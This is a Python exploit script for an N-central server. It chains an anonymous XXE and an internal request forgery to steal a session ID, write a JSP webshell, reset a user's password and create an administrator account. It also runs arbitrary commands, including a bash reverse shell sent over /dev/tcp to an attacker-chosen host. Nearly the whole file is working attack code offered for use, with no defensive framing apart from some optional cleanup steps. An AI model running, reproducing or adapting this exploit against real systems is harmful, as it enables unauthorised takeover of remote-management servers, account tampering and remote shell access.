#!/usr/bin/env python3
"""N-central 2026.4.0.31: anonymous XXE to command execution as nable."""

import argparse
import base64
import getpass
import http.cookiejar
import http.server
import os
import re
import secrets
import ssl
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import xml.etree.ElementTree as ET


def args():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="192.168.1.14")
    p.add_argument("--appliance-id", default="1809608396")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--callback-bind", default="0.0.0.0")
    p.add_argument("--callback-port", type=int, default=18134)
    p.add_argument("--user-id", type=int, required=True)
    p.add_argument("--username", required=True)
    p.add_argument("--customer-id", default="1")
    p.add_argument("--so-name", default="")
    p.add_argument("--restore-password")
    p.add_argument("--create-admin-username")
    p.add_argument(
        "--create-admin-password",
        default=os.environ.get("NCENTRAL_NEW_ADMIN_PASSWORD"),
    )
    p.add_argument("--admin-customer-id", default="101")
    p.add_argument("--admin-role-id", type=int, default=1002)
    p.add_argument("--admin-access-group-id", type=int, action="append")
    p.add_argument("--admin-so-name", default="Local")
    p.add_argument("--delete-created-admin", action="store_true")
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--proxy", required=True)
    opt = p.parse_args()
    if opt.admin_access_group_id is None:
        opt.admin_access_group_id = [205017650]
    if opt.create_admin_username and not opt.create_admin_password:
        opt.create_admin_password = getpass.getpass("New administrator password: ")
    if opt.create_admin_password and not opt.create_admin_username:
        p.error("--create-admin-password requires --create-admin-username")
    if opt.delete_created_admin and not opt.create_admin_username:
        p.error("--delete-created-admin requires --create-admin-username")
    return opt


class Callback(http.server.BaseHTTPRequestHandler):
    dtd = {}
    seen = set()
    public_host = ""

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        type(self).seen.add(path)
        if path.endswith(".xsd"):
            dtd_path = path[:-4] + ".dtd"
            body = (
                '<?xml version="1.0"?>\n'
                f'<!DOCTYPE xs:schema SYSTEM "http://{self.public_host}:'
                f'{self.server.server_port}{dtd_path}">\n'
                '<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">'
                '<xs:element name="service" type="xs:anyType"/>'
                '</xs:schema>'
            ).encode()
        elif path in self.dtd:
            body = self.dtd[path]
        else:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_):
        pass


class Exploit:
    def __init__(self, opt):
        if not re.fullmatch(r"[A-Za-z0-9.:-]+", opt.callback_host):
            raise SystemExit("invalid callback host")
        self.o = opt
        self.soap = f"https://{opt.target}"
        self.ui = f"https://{opt.target}:8443"
        self.install_log = (
            "/opt/nable/webapps/ROOT/applianceLog/"
            f"install_log_{opt.appliance_id}.log"
        )
        self.network_log = (
            "/opt/nable/webapps/ROOT/applianceLog/"
            f"network_check_log_{opt.appliance_id}.log"
        )
        self.client = self.opener()
        self.mms_sid = None

    def opener(self, cookies=False):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        handlers = [
            urllib.request.ProxyHandler(
                {"http": self.o.proxy, "https": self.o.proxy}
            ),
            urllib.request.HTTPSHandler(context=context),
        ]
        if cookies:
            handlers.append(
                urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
            )
        return urllib.request.build_opener(*handlers)

    def request(self, client, url, body=None, content_type=None, extra_headers=None):
        headers = {}
        if content_type:
            headers["Content-Type"] = content_type
        if extra_headers:
            headers.update(extra_headers)
        req = urllib.request.Request(
            url,
            data=body,
            headers=headers,
            method="POST" if body is not None else "GET",
        )
        try:
            with client.open(req, timeout=60) as response:
                return response.status, response.read(), response.geturl()
        except urllib.error.HTTPError as e:
            return e.code, e.read(), e.geturl()

    def soap12(self, path, xml):
        return self.request(
            self.client,
            self.soap + path,
            xml.encode(),
            "application/soap+xml; charset=UTF-8",
        )

    def soap11(self, path, xml):
        return self.request(
            self.client,
            self.soap + path,
            xml.encode(),
            "text/xml; charset=UTF-8",
            {"SOAPAction": '""'},
        )

    def session_hello(self):
        xml = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms2.nobj.nable.com/"><soap:Body><m:SessionHello>
<m:version>2.0.0</m:version><m:applianceVersion>1.0.0.0</m:applianceVersion>
<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>
<m:applianceID>{self.o.appliance_id}</m:applianceID><m:timeZoneID>-05:00</m:timeZoneID>
</m:SessionHello></soap:Body></soap:Envelope>'''
        status, body, _ = self.soap12("/dms2/services2/ServerMMS2", xml)
        match = re.search(rb"<return>([0-9]+)</return>", body)
        if status != 200 or not match:
            raise RuntimeError("anonymous MMS session failed")
        self.mms_sid = match.group(1).decode()

    def upload(self, log_type, content):
        data = base64.b64encode(content).decode()
        xml = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms2.nobj.nable.com/"><soap:Body><m:ApplianceLogSubmit>
<m:sessionID>{self.mms_sid}</m:sessionID><m:logType>{log_type}</m:logType>
<m:contents>{data}</m:contents></m:ApplianceLogSubmit></soap:Body></soap:Envelope>'''
        status, body, _ = self.soap12("/dms2/services2/ServerMMS2", xml)
        if status != 200 or b"<return>Ok</return>" not in body:
            raise RuntimeError(f"{log_type} upload failed")

    def trigger_import(self):
        xml = f'''<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:m="http://www.n-able.com/mickey"><soapenv:Body>
<m:ImportServiceFromFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SessionID xsi:type="xsd:int">2147483000</SessionID>
<CustomerID xsi:type="xsd:int">1</CustomerID>
<FilePath xsi:type="xsd:string">{self.install_log}</FilePath>
<CustomService xsi:type="xsd:boolean">false</CustomService>
</m:ImportServiceFromFile></soapenv:Body></soapenv:Envelope>'''
        return self.soap11("/dms/services/ServerUI", xml)[0]

    def phase(self, name, dtd):
        stem = f"/{name}-{uuid.uuid4().hex[:8]}"
        xsd_path, dtd_path = stem + ".xsd", stem + ".dtd"
        Callback.dtd[dtd_path] = dtd.encode()
        carrier = (
            '<?xml version="1.0"?>\n'
            '<service xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
            f'xsi:noNamespaceSchemaLocation="http://{self.o.callback_host}:'
            f'{self.o.callback_port}{xsd_path}" syntaxversion="1.1.0.0">'
            '<Name>System Health</Name></service>\n'
        ).encode()
        self.upload("INSTALLATION_LOG", carrier)
        self.trigger_import()
        for _ in range(100):
            if xsd_path in Callback.seen and dtd_path in Callback.seen:
                return
            time.sleep(0.05)
        raise RuntimeError(f"{name} callback not observed")

    @staticmethod
    def dtd_for_url(url):
        return (
            "<!ENTITY % sid SYSTEM 'file:///var/opt/n-central/jetty/nci-session.id'>\n"
            f'<!ENTITY % bind "<!ENTITY &#x25; fire SYSTEM \'{url}\'>">\n'
            "%bind;\n%fire;\n"
        )

    def write_jsp(self, stage_path):
        command = urllib.parse.quote(
            f"<item>printallstacks</item><item>{self.network_log}</item>"
            f"<item>{stage_path}</item>",
            safe="",
        ).replace("%", "&#x25;")
        url = (
            "http://127.0.0.1:81/dms/services/ServerUI?method=nci"
            "&#x26;SessionID=%sid;&#x26;Command=" + command
        )
        self.phase("write", self.dtd_for_url(url))

    def reset_password(self, password):
        prime = (
            "http://127.0.0.1:81/dms/services/ServerUI?"
            "method=systemGetNetworkInfo&#x26;SessionID=%sid;"
        )
        encoded = urllib.parse.quote(password, safe="").replace("%", "&#x25;")
        reset = (
            "http://127.0.0.1:81/dms/services/ServerUI?method=userModifyPassword"
            "&#x26;SessionID=%sid;"
            f"&#x26;userID={self.o.user_id}&#x26;oldPassword="
            f"&#x26;newPassword={encoded}&#x26;invalidateSessionMode=0"
            "&#x26;sendEmail=false"
        )
        self.phase("prime", self.dtd_for_url(prime))
        self.phase("reset", self.dtd_for_url(reset))

    def login_credentials(
        self, username, password, customer_id, so_name, required=True
    ):
        client = self.opener(cookies=True)
        self.request(client, self.ui + "/login")
        form = urllib.parse.urlencode(
            {
                "username": username,
                "password": password,
                "customerId": customer_id,
                "soName": so_name,
            }
        ).encode()
        status, _, final = self.request(
            client,
            self.ui + "/loginLoginAction.action",
            form,
            "application/x-www-form-urlencoded",
        )
        accepted = status == 200 and "IndexAction.action" in final
        if not accepted:
            if required:
                raise RuntimeError("credentials did not authenticate")
            return None
        return client

    def login(self, password):
        return self.login_credentials(
            self.o.username,
            password,
            self.o.customer_id,
            self.o.so_name,
        )

    def restore_password(self, password):
        for _ in range(3):
            self.reset_password(password)
            client = self.login_credentials(
                self.o.username,
                password,
                self.o.customer_id,
                self.o.so_name,
                required=False,
            )
            if client is not None:
                return
        raise RuntimeError("account password restoration failed")

    def create_admin(self, caller_password):
        soap_ns = "http://www.w3.org/2003/05/soap-envelope"
        ei_ns = "http://ei2.nobj.nable.com/"
        envelope = ET.Element(f"{{{soap_ns}}}Envelope")
        body = ET.SubElement(envelope, f"{{{soap_ns}}}Body")
        call = ET.SubElement(body, f"{{{ei_ns}}}userAdd")
        ET.SubElement(call, f"{{{ei_ns}}}username").text = self.o.username
        ET.SubElement(call, f"{{{ei_ns}}}password").text = caller_password
        settings = [
            ("email", self.o.create_admin_username),
            ("password", self.o.create_admin_password),
            ("customerid", str(self.o.admin_customer_id)),
            ("status", "enabled"),
            ("firstname", "System"),
            ("lastname", "Administrator"),
            ("username", self.o.create_admin_username),
            ("userroleID", str(self.o.admin_role_id)),
        ]
        settings.extend(
            ("accessgroupID", str(group_id))
            for group_id in self.o.admin_access_group_id
        )
        for key, value in settings:
            item = ET.SubElement(call, f"{{{ei_ns}}}settings")
            ET.SubElement(item, f"{{{ei_ns}}}key").text = key
            ET.SubElement(item, f"{{{ei_ns}}}value").text = value
        ET.register_namespace("soap", soap_ns)
        ET.register_namespace("ei", ei_ns)
        status, response, _ = self.request(
            self.client,
            self.soap + "/dms2/services2/ServerEI2",
            ET.tostring(envelope, encoding="utf-8"),
            'application/soap+xml; charset=UTF-8; action=""',
        )
        try:
            root = ET.fromstring(response)
        except ET.ParseError as error:
            raise RuntimeError("administrator creation returned invalid XML") from error
        returned = next(
            (
                element.text
                for element in root.iter()
                if element.tag.rsplit("}", 1)[-1] == "return"
                and (element.text or "").isdigit()
            ),
            None,
        )
        if status != 200 or returned is None:
            raise RuntimeError("administrator creation failed")
        return int(returned)

    def verify_admin(self):
        client = self.login_credentials(
            self.o.create_admin_username,
            self.o.create_admin_password,
            self.o.admin_customer_id,
            self.o.admin_so_name,
        )
        tab = "admin-proof-" + uuid.uuid4().hex[:8]
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "ncentralTabId": tab,
        }
        navigation = urllib.parse.urlencode(
            {
                "ncentralTabId": tab,
                "custId": self.o.admin_customer_id,
                "custName": self.o.admin_so_name,
            }
        )
        self.request(
            client,
            self.ui + "/refreshNavAction.action?" + navigation,
            extra_headers=headers,
        )
        query = urllib.parse.urlencode({"ncentralTabId": tab})
        status, _, final = self.request(
            client,
            self.ui + "/addUsersAction.action?" + query,
            extra_headers=headers,
        )
        if status not in (200, 500) or "addUsersAction.action" not in final:
            raise RuntimeError("administrator permission check failed")
        return status

    def delete_user(self, client, user_id):
        tab = "account-cleanup"
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "ncentralTabId": tab,
        }
        navigation = urllib.parse.urlencode(
            {
                "ncentralTabId": tab,
                "custId": "1",
                "custName": "System",
            }
        )
        self.request(
            client,
            self.ui + "/refreshNavAction.action?" + navigation,
            extra_headers=headers,
        )
        form = urllib.parse.urlencode(
            {
                "selectedGroup": str(user_id),
                "transferFilterUserId": "-1",
                "transferAdvancedReportingUserId": "-1",
            }
        ).encode()
        query = urllib.parse.urlencode({"ncentralTabId": tab})
        status, _, final = self.request(
            client,
            self.ui + "/deleteUsersAction.action?" + query,
            form,
            "application/x-www-form-urlencoded",
            headers,
        )
        if status != 200 or "deleteUsersAction.action" not in final:
            raise RuntimeError("administrator deletion failed")

    def admin_login_accepted(self):
        return self.login_credentials(
            self.o.create_admin_username,
            self.o.create_admin_password,
            self.o.admin_customer_id,
            self.o.admin_so_name,
            required=False,
        ) is not None

    def quit(self):
        if not self.mms_sid:
            return
        xml = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms2.nobj.nable.com/"><soap:Body><m:SessionQuit>
<m:sessionID>{self.mms_sid}</m:sessionID><m:shutdown>false</m:shutdown>
</m:SessionQuit></soap:Body></soap:Envelope>'''
        self.soap12("/dms2/services2/ServerMMS2", xml)


def java_string(value):
    return value.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")


def main():
    opt = args()
    shell_listener = None
    if opt.lhost:
        from pwn import context, listen

        context.log_level = "error"
        shell_listener = listen(opt.lport, bindaddr=opt.callback_bind, timeout=60)
        command = f"exec bash -i >& /dev/tcp/{opt.lhost}/{opt.lport} 0>&1"
        wait = False
    else:
        command = opt.command
        wait = True

    exploit = Exploit(opt)
    Callback.public_host = opt.callback_host
    server = http.server.ThreadingHTTPServer(
        (opt.callback_bind, opt.callback_port), Callback
    )
    threading.Thread(target=server.serve_forever, daemon=True).start()
    name = "diag_" + secrets.token_hex(6) + ".jsp"
    path = "/opt/nable/webapps/ROOT/applianceLog/" + name
    url = exploit.ui + "/applianceLog/" + name
    command = java_string(command)
    if wait:
        code = (
            f'Process p=new ProcessBuilder("/bin/bash","-c","{command}")'
            '.redirectErrorStream(true).start();'
            'String o=new String(p.getInputStream().readAllBytes(),'
            'java.nio.charset.StandardCharsets.UTF_8);p.waitFor();'
            f'java.nio.file.Files.deleteIfExists(java.nio.file.Path.of("{path}"));'
            'out.clearBuffer();out.print(o);'
        )
    else:
        code = (
            f'new ProcessBuilder("/bin/bash","-c","{command}").start();'
            f'java.nio.file.Files.deleteIfExists(java.nio.file.Path.of("{path}"));'
            'out.clearBuffer();out.print("reverse shell started");'
        )
    stack = (
        '"diagnostic-worker" #1 prio=5 tid=0x1 nid=0x1 runnable\n'
        '   java.lang.Thread.State: RUNNABLE\n'
        '<jsp:scriptlet\n>\n' + code + '\n</jsp:scriptlet\n>\n\n'
    ).encode()
    password = "Tmp!9" + secrets.token_hex(12)
    created_admin_id = None
    client = None
    password_changed = False
    password_restored = False

    try:
        exploit.session_hello()
        exploit.upload("NETWORK_CHECK_LOG", stack)
        exploit.write_jsp(path)
        exploit.request(exploit.client, url)
        exploit.reset_password(password)
        password_changed = True
        client = exploit.login(password)
        if opt.create_admin_username:
            created_admin_id = exploit.create_admin(password)
            print(f"created_admin_id={created_admin_id}")
            permission_status = exploit.verify_admin()
            print("created_admin_login=accepted")
            print(f"created_admin_role_id={opt.admin_role_id}")
            print(f"created_admin_protected_action={permission_status}")
        status, body, _ = exploit.request(client, url)
        if status != 200:
            raise RuntimeError("JSP did not execute")
        if shell_listener:
            shell_listener.wait_for_connection()
            if shell_listener.sock is None:
                raise RuntimeError("reverse shell callback not received")
            print("reverse_shell_connected=true")
            shell_listener.interactive()
        else:
            output = body.decode(errors="replace").split(
                "\n\n---------------------------------------------------", 1
            )[0]
            print(output.strip())
        if opt.delete_created_admin and created_admin_id is not None:
            exploit.delete_user(client, created_admin_id)
            if exploit.admin_login_accepted():
                raise RuntimeError("created administrator was not deleted")
            print("created_admin_deleted=true")
            created_admin_id = None
        if opt.restore_password:
            exploit.restore_password(opt.restore_password)
            print("account_password_restored=true")
            password_restored = True
        else:
            print("warning=account password remains attacker-selected")
    finally:
        if opt.delete_created_admin and created_admin_id is not None:
            try:
                exploit.delete_user(client, created_admin_id)
                if exploit.admin_login_accepted():
                    raise RuntimeError("created administrator was not deleted")
                print("created_admin_deleted=true")
                created_admin_id = None
            except Exception:
                print("created_admin_cleanup_failed=true")
        if opt.restore_password and password_changed and not password_restored:
            try:
                exploit.restore_password(opt.restore_password)
                print("account_password_restored=true")
                password_restored = True
            except Exception:
                print("account_password_restore_failed=true")
        if exploit.mms_sid:
            try:
                exploit.upload("NETWORK_CHECK_LOG", b"diagnostic complete\n")
                exploit.upload(
                    "INSTALLATION_LOG",
                    b'<service syntaxversion="1.1.0.0"><Name>System Health</Name></service>\n',
                )
                print("staging_logs_neutralized=true")
            except Exception:
                pass
        exploit.quit()
        server.shutdown()
        server.server_close()


if __name__ == "__main__":
    main()
